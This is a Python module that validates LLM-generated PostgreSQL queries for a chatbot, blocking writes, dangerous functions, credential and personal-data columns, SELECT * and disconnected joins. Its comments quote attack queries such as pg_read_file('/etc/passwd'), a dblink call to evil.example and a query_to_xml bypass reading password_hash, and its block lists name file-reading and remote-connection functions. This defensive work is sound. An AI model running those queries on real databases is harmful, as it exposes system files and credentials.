"""
Read-only SQL validation, enforced in code rather than only in the
prompt.

The prompt tells the model "SELECT only", "use only these tables", and
"never select credentials or personal contact fields" - but a prompt is
not an access-control mechanism. A hallucinated table/column, or a user
question crafted to manipulate the model, can still get past a
prompt-only check. Everything here runs on the *parsed* SQL tree, so it
holds regardless of what the model was told.

BLOCKED_COLUMN_NAMES / BLOCKED_QUALIFIED_COLUMNS exist for the same
reason as BLOCKED_STATEMENT_TYPES and the table allow-list: this
chatbot has no per-user authorization anywhere in the pipeline yet
(see the project's "known gaps" notes), so until something can check
WHO is asking, real credentials (password_hash, auth_string, token,
session_id, ...) and direct personal contact/identity fields (email,
mobile_number, birthdate, a profile photo) are blocked for everyone,
unconditionally. This is a data-classification floor, not RBAC - it
doesn't know or care who's asking, it just never lets these specific
columns leave the database.
"""

import re

import sqlglot
from sqlglot import exp

SQL_DIALECT = "postgres"

# Checked structurally on the parsed tree, not with a keyword/regex scan
# over the raw text. A text search would either:
#   - false-positive on legitimate data, e.g. WHERE status = 'DELETE'
#   - or, scoped only to the top-level statement, miss a writable CTE:
#       WITH t AS (DELETE FROM x RETURNING *) SELECT * FROM t
#     ...which parses as a top-level SELECT while still performing a
#     DELETE. Walking the whole tree catches this while leaving string
#     literals alone.
BLOCKED_STATEMENT_TYPES = (
    exp.Insert,
    exp.Update,
    exp.Delete,
    exp.Drop,
    exp.Alter,
    exp.Create,
    exp.TruncateTable,
    exp.Grant,
    exp.Revoke,
    exp.Command,  # catches VACUUM / ANALYZE / COMMENT / misc DDL
)

# Real credentials and session/security state - no legitimate chatbot
# answer ever includes these, regardless of which table they're on, so
# these are blocked by bare column name rather than qualified by table.
# Found by scanning the full schema (SQL_AGENT/Data/semantic_kb.json)
# for password/token/session-shaped columns - see pc.sys_user and
# masters.party.
_BLOCKED_SECRET_COLUMN_NAMES = {
    "password_hash",
    "auth_string",
    "token",
    "session_id",
    "activation_key",
    "reset_key",
    "reset_remarks",
    "ip",
}

# Direct personal contact/identity fields - blocked by default because
# no per-user authorization exists anywhere in this pipeline yet (see
# the "No user-authority/RBAC enforcement" gap): until something can
# check WHO is asking, exposing WHOSE contact details they can see
# isn't a call this validator can make, so the safe default is never.
_BLOCKED_PII_COLUMN_NAMES = {
    "email",
    "mobile_number",
    "birthdate",
    "profile_picture",
    "profile_picture_content_type",
}

BLOCKED_COLUMN_NAMES = _BLOCKED_SECRET_COLUMN_NAMES | _BLOCKED_PII_COLUMN_NAMES

# Ambiguous elsewhere in the schema - masters.product_store.image_url is
# a store/organizational-unit logo, not a person's photo, so this name
# is only blocked on the specific table where it IS personal data.
# Keyed by bare table name (not schema-qualified): table names are
# unique across this DB's schemas, and a query may or may not bother
# schema-qualifying its FROM/JOIN.
BLOCKED_QUALIFIED_COLUMNS = {
    ("sys_user", "image_url"),
}

# All legal to call from inside a plain SELECT, so the statement-type
# check above never sees them. Each is a real way to turn a "read-only
# SELECT" into file access, network access, or a denial-of-service:
#   SELECT pg_read_file('/etc/passwd');
#   SELECT pg_sleep(999999);
#   SELECT * FROM dblink('host=evil.example', 'select 1');
BLOCKED_FUNCTIONS = {
    "pg_sleep",
    "pg_read_file",
    "pg_read_binary_file",
    "pg_ls_dir",
    "pg_stat_file",
    "pg_relation_filepath",
    "lo_import",
    "lo_export",
    "dblink",
    "dblink_connect",
    "dblink_exec",
    "pg_terminate_backend",
    "pg_cancel_backend",
    "pg_reload_conf",
    "pg_read_server_files",
    "set_config",
    "current_setting",
    "pg_write_file",
    "copy_from_program",
    "copy_to_program",
    "nextval",
    "setval",
    "pg_notify",
}

# Whole families matched by name shape, not enumerated one by one - an
# exact-name list already missed pg_sleep_for / pg_ls_waldir, and each
# family has more members than anyone will remember to list:
#   - *_to_xml*  (query_to_xml, table_to_xml, cursor_to_xml,
#     database_to_xml, ...): these take SQL text or a table NAME as a
#     string argument and run it server-side, so the inner query is
#     never parsed by this validator at all - query_to_xml('select
#     password_hash from pc.sys_user', ...) bypasses every check below.
#   - pg_sleep* / pg_ls_* / pg_read_* / pg_advisory* / lo_* / dblink*:
#     sleep variants, filesystem listing/reading, lock-taking, large
#     object and remote-connection access.
BLOCKED_FUNCTION_SUBSTRINGS = ("_to_xml",)
BLOCKED_FUNCTION_PREFIXES = (
    "pg_sleep",
    "pg_ls_",
    "pg_read_",
    "pg_advisory",
    "pg_file",
    "lo_",
    "dblink",
)

# sqlglot parses these into typed nodes (exp.CurrentUser, ...) rather
# than exp.Anonymous, so they never show up by name in the function
# scan - matched by node class instead. They disclose server/account
# details (version(), current_user, ...) that IDENTITY_STATEMENT treats
# as internal infrastructure. Deliberately excludes CURRENT_DATE/now():
# those are ordinary, needed for "last month"-style questions.
BLOCKED_FUNCTION_NODES = (
    exp.CurrentUser,
    exp.SessionUser,
    exp.CurrentVersion,
    exp.CurrentDatabase,
    exp.CurrentSchema,
)


def clean_sql(sql: str) -> str:
    if not sql:
        raise ValueError("LLM returned empty SQL")

    sql = sql.strip()

    sql = re.sub(r"^```(?:sql)?\s*", "", sql, flags=re.IGNORECASE)
    sql = re.sub(r"\s*```$", "", sql, flags=re.IGNORECASE)

    sql = sql.strip()

    if sql == "CANNOT_ANSWER":
        raise ValueError("LLM returned CANNOT_ANSWER")

    return sql


def _parse_single_statement(sql: str) -> exp.Expression:
    try:
        parsed = sqlglot.parse(sql, read=SQL_DIALECT)
    except Exception as e:
        raise ValueError(f"SQL could not be parsed: {e}") from e

    statements = [s for s in parsed if s is not None]

    if len(statements) != 1:
        raise ValueError("Only one SQL statement is allowed")

    return statements[0]


def _check_allowed_tables(tree: exp.Expression, allowed_tables) -> None:
    if allowed_tables is None:
        return

    allowed_qualified = {name.lower() for name in allowed_tables}

    allowed_bare: dict[str, set[str]] = {}
    for name in allowed_tables:
        bare = name.split(".")[-1].lower()
        allowed_bare.setdefault(bare, set()).add(name.lower())

    # A reference to a CTE (WITH t AS (...) ... FROM t) parses as an
    # exp.Table too, but it's a name the query itself defined, not a real
    # table - its body is a Select that this same walk already checks.
    cte_names = {cte.alias_or_name.lower() for cte in tree.find_all(exp.CTE)}

    not_allowed = set()

    for table in tree.find_all(exp.Table):
        # FROM generate_series(...) / unnest(...) is an exp.Table wrapping
        # a function, with no table name at all - the function itself is
        # covered by the function blocklist in validate_sql.
        if not isinstance(table.this, exp.Identifier):
            continue
        if not table.db and table.name.lower() in cte_names:
            continue
        if table.db:
            qualified = f"{table.db}.{table.name}".lower()
            if qualified not in allowed_qualified:
                not_allowed.add(qualified)
        else:
            bare = table.name.lower()
            if bare not in allowed_bare:
                not_allowed.add(bare)

    if not_allowed:
        raise ValueError(
            "Query references tables outside the allowed schema: "
            f"{', '.join(sorted(not_allowed))}"
        )


def _check_no_star(tree: exp.Expression) -> None:
    # SELECT * (or table.*) returns every column a table has, including
    # any blocked one - it would bypass the column-name check below
    # entirely, so "never use SELECT *" can't be left as a prompt-only
    # rule the way it currently is in SQL_AGENT_SYSTEM_PROMPT.
    #
    # Only each Select's own top-level output list is checked - not the
    # whole tree with tree.find(exp.Star), which would also flag the
    # `*` inside a perfectly safe COUNT(*) (that `*` is a function
    # argument meaning "count rows", not a column selection).
    for select in tree.find_all(exp.Select):
        for selected in select.expressions:
            if isinstance(selected, exp.Star) or (
                isinstance(selected, exp.Column) and isinstance(selected.this, exp.Star)
            ):
                raise ValueError(
                    "SELECT * is not allowed - list the specific columns needed"
                )

    # alias.* is just as much "every column" when it's a function
    # argument (to_jsonb(p.*), row_to_json(p.*), ROW(p.*)) as when it's
    # a top-level output - only a bare `*` (COUNT(*)) is exempt, since
    # that one never expands to columns.
    for column in tree.find_all(exp.Column):
        if isinstance(column.this, exp.Star):
            raise ValueError(
                f"{column.sql(dialect=SQL_DIALECT)} is not allowed anywhere in a "
                "query - list the specific columns needed"
            )


def _check_no_whole_row_reference(tree: exp.Expression, table_columns=None) -> None:
    # A table alias used as a bare value - SELECT u, row_to_json(u),
    # json_agg(p), u::text - is a whole-row reference in PostgreSQL: it
    # carries every column of that table, blocked ones included, without
    # ever naming them, so neither the star check nor the blocked-column
    # check below can see it. sqlglot parses it as an ordinary unqualified
    # Column, so the only tell is that its name is one of the query's own
    # FROM/JOIN aliases.
    #
    # PostgreSQL resolves an unqualified name to a real column BEFORE a
    # table alias, and this schema really has that overlap
    # (masters.job_code.status next to a joined masters.status,
    # lms.tm_job_code.job_code next to masters.job_code) - so a name that
    # is a real column of a table in this query (per table_columns, keyed
    # like allowed_tables) is left alone. Without table_columns, every
    # alias-named column is refused, the safe default.
    tables = [t for t in tree.find_all(exp.Table) if isinstance(t.this, exp.Identifier)]
    aliases = {t.alias_or_name.lower() for t in tables}

    columns_by_bare: dict[str, set[str]] = {}
    for name, cols in (table_columns or {}).items():
        columns_by_bare.setdefault(name.split(".")[-1].lower(), set()).update(cols)
    real_columns = set()
    for t in tables:
        real_columns |= columns_by_bare.get(t.name.lower(), set())

    for column in tree.find_all(exp.Column):
        name = column.name.lower()
        if not column.table and name in aliases and name not in real_columns:
            raise ValueError(
                f"'{column.name}' is a table alias used as a value (a whole-row "
                "reference, which returns every column of the table) - select "
                "the specific columns needed instead, e.g. "
                f"{column.name}.<column_name>"
            )


def _check_blocked_columns(tree: exp.Expression) -> None:
    # Resolve each alias/bare name used in the query's FROM/JOIN back to
    # its real table, so the one ambiguous blocked column
    # (BLOCKED_QUALIFIED_COLUMNS) can be checked per-table instead of
    # blocked everywhere that name appears.
    alias_to_table: dict[str, str] = {}
    for table in tree.find_all(exp.Table):
        bare = table.name.lower()
        alias_to_table[table.alias_or_name.lower()] = bare
        alias_to_table[bare] = bare

    single_table = next(iter(set(alias_to_table.values()))) if len(set(alias_to_table.values())) == 1 else None

    blocked_found = set()

    for column in tree.find_all(exp.Column):
        col_name = column.name.lower()

        if col_name in BLOCKED_COLUMN_NAMES:
            blocked_found.add(col_name)
            continue

        table_ref = alias_to_table.get(column.table.lower()) if column.table else single_table
        if table_ref and (table_ref, col_name) in BLOCKED_QUALIFIED_COLUMNS:
            blocked_found.add(f"{table_ref}.{col_name}")

    if blocked_found:
        raise ValueError(
            "Query references blocked column(s): "
            f"{', '.join(sorted(blocked_found))} - these hold "
            "credentials, session/security data, or personal contact "
            "information and can never be returned by this agent."
        )


def _own_columns(node: exp.Expression):
    """Columns of `node` itself, not of any nested subquery (another scope)."""
    stack = [node]
    while stack:
        current = stack.pop()
        if isinstance(current, exp.Column):
            yield current
            continue
        for child in current.iter_expressions():
            if not isinstance(child, (exp.Select, exp.Subquery)):
                stack.append(child)


def _check_connected_joins(tree: exp.Expression, table_columns=None) -> None:
    # A JOIN whose condition never relates the joined table to the rest of
    # the query is a cartesian product in disguise, and it silently
    # multiplies every count: observed `FROM lms.user_training ut JOIN
    # pc.sys_user su ON su.login = 'oquser8' JOIN masters.party p ON
    # p.user_id = su.id ...` - ut is never linked to p/su, so "trainings
    # oquser8 completed" counted every user's (57 instead of 2).
    # Structural, so it holds for any tables: within one SELECT, every
    # source must be reachable from every other through conditions (ON or
    # WHERE) that reference both. Intentional products (CROSS JOIN,
    # LATERAL, a comma list, set-returning functions) and anything this
    # can't attribute with certainty are left alone - it only refuses what
    # it can prove is disconnected.
    columns_by_bare: dict[str, set[str]] = {}
    for name, cols in (table_columns or {}).items():
        columns_by_bare.setdefault(name.split(".")[-1].lower(), set()).update(cols)

    for select in tree.find_all(exp.Select):
        from_ = select.args.get("from_")
        joins = select.args.get("joins") or []
        if not from_ or not joins:
            continue
        sources = [from_.this] + [j.this for j in joins]
        if any(not isinstance(s, (exp.Table, exp.Subquery)) or
               (isinstance(s, exp.Table) and not isinstance(s.this, exp.Identifier)) for s in sources):
            continue
        if any(j.args.get("kind") == "CROSS" or j.args.get("using") or j.args.get("method")
               or isinstance(j.this, exp.Lateral) or not j.args.get("on") for j in joins):
            continue

        aliases = [s.alias_or_name.lower() for s in sources]
        if len(set(aliases)) != len(aliases):
            continue
        bare_of = {s.alias_or_name.lower(): (s.name.lower() if isinstance(s, exp.Table) else None) for s in sources}

        def owner(column: exp.Column) -> str | None:
            if column.table:
                t = column.table.lower()
                return t if t in bare_of else "?"
            owners = [a for a, bare in bare_of.items() if bare and column.name.lower() in columns_by_bare.get(bare, set())]
            return owners[0] if len(owners) == 1 else "?"

        parent = {a: a for a in aliases}

        def find(a):
            while parent[a] != a:
                parent[a] = parent[parent[a]]
                a = parent[a]
            return a

        conditions = [j.args["on"] for j in joins]
        if select.args.get("where"):
            conditions.append(select.args["where"].this)

        uncertain = False
        for condition in conditions:
            for predicate in _conjunct_list(condition):
                owners = {owner(c) for c in _own_columns(predicate)}
                if "?" in owners:
                    uncertain = True
                    break
                owners = list(owners)
                for other in owners[1:]:
                    parent[find(other)] = find(owners[0])
            if uncertain:
                break
        if uncertain:
            continue

        groups: dict[str, list[str]] = {}
        for a in aliases:
            groups.setdefault(find(a), []).append(a)
        if len(groups) > 1:
            listed = " | ".join(", ".join(g) for g in groups.values())
            raise ValueError(
                "JOIN conditions leave these table groups unconnected to each other: "
                f"{listed}. Unconnected tables form a cartesian product that multiplies "
                "every row count - add the join condition that links them (the FK "
                "column shown under JOINS), not just a filter on the joined table."
            )


def _conjunct_list(condition: exp.Expression) -> list[exp.Expression]:
    if isinstance(condition, exp.Paren):
        return _conjunct_list(condition.this)
    if isinstance(condition, exp.And):
        return _conjunct_list(condition.left) + _conjunct_list(condition.right)
    return [condition]


def validate_sql(sql: str, allowed_tables=None, table_columns=None) -> str:
    sql = clean_sql(sql)
    tree = _parse_single_statement(sql)

    # WITH ... SELECT parses as a Select node with a CTE attached, so
    # this also covers WITH.
    if not isinstance(tree, (exp.Select, exp.Union)):
        raise ValueError("Only SELECT/WITH queries are allowed")

    nested_dml = tree.find(BLOCKED_STATEMENT_TYPES)
    if nested_dml is not None:
        raise ValueError(
            f"Blocked SQL operation: {nested_dml.__class__.__name__.upper()}"
        )

    # Only exp.Anonymous carries the function's name as written - a typed
    # sqlglot node (exp.Lower, exp.Cast, ...) reports '' or its first
    # argument's name from .name instead, which is never a function name.
    called_functions = {
        node.name.lower() for node in tree.find_all(exp.Anonymous) if node.name
    }

    blocked_calls = {
        name for name in called_functions
        if name in BLOCKED_FUNCTIONS
        or name.startswith(BLOCKED_FUNCTION_PREFIXES)
        or any(part in name for part in BLOCKED_FUNCTION_SUBSTRINGS)
    }
    blocked_calls |= {
        node.sql(dialect=SQL_DIALECT).lower()
        for node in tree.find_all(BLOCKED_FUNCTION_NODES)
    }
    if blocked_calls:
        raise ValueError(f"Blocked function call: {', '.join(sorted(blocked_calls))}")

    # SELECT ... FOR UPDATE/SHARE takes row locks on the source DB - a
    # read-only transaction still allows it, so it has to be refused here.
    if any(select.args.get("locks") for select in tree.find_all(exp.Select)):
        raise ValueError("Row-locking clauses (FOR UPDATE / FOR SHARE) are not allowed")

    # Defense in depth: even if the model was told the wrong tables, or
    # a question tries to manipulate it into a different schema, this
    # runs on the parsed query regardless of what the prompt said.
    _check_allowed_tables(tree, allowed_tables)

    # Same reasoning, for what the query actually selects rather than
    # which tables it touches: a prompt telling the model "don't select
    # passwords/contact info" is not an access-control mechanism either.
    _check_no_star(tree)
    _check_no_whole_row_reference(tree, table_columns)
    _check_blocked_columns(tree)
    _check_connected_joins(tree, table_columns)

    return tree.sql(dialect=SQL_DIALECT)


def apply_row_limit(tree: exp.Expression, limit: int) -> exp.Expression:
    existing_limit = tree.args.get("limit")

    if existing_limit is not None:
        # LIMIT n keeps n under .expression; FETCH FIRST n ROWS ONLY is an
        # exp.Fetch in the same slot, keeping n under "count" instead -
        # reading only .expression silently replaced FETCH FIRST 5 with the
        # cap, returning up to 100 rows for a query that asked for 5.
        count = (
            existing_limit.args.get("count")
            if isinstance(existing_limit, exp.Fetch)
            else existing_limit.expression
        )
        try:
            existing_value = int(count.this)
        except Exception:
            existing_value = None

        if existing_value is None or existing_value > limit:
            return tree.limit(limit)

        return tree

    return tree.limit(limit)
